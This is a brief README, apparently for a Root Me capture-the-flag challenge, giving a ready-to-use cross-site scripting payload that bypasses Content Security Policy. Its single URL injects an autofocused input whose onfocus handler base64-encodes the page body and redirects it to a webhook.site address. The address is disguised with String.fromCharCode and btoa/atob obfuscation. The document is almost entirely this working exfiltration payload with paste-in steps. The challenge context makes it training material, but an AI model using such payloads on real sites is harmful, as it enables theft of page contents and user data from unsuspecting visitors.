# CSP-Bypass-Root-Me
Code Exploitation For CSP Bypass Root Me challenge  

1. Replace webhook site url with Yours *WITHOUT ENTER HTTPS://*
2. Put the completed url in your browser
3. Navigate to your own webhook and you will see data parameter contain base64 data , decode it and you will get the flag  
```
http://challenge01.root-me.org:58008/page?user=</h1><input+autofocus+onfocus='let+a+=btoa(document.body.innerHTML);let+server=btoa("webhook.site/e184124c-f8bc-4235-b025-349cf897188d");let+schema=String.fromCharCode(104,116,116,112,115,58,47,47);let+full_url=schema%2batob(server);location=(`${full_url}?data=${a}`)'/>Never+Click+Here%0a<h1>Elmagek
```
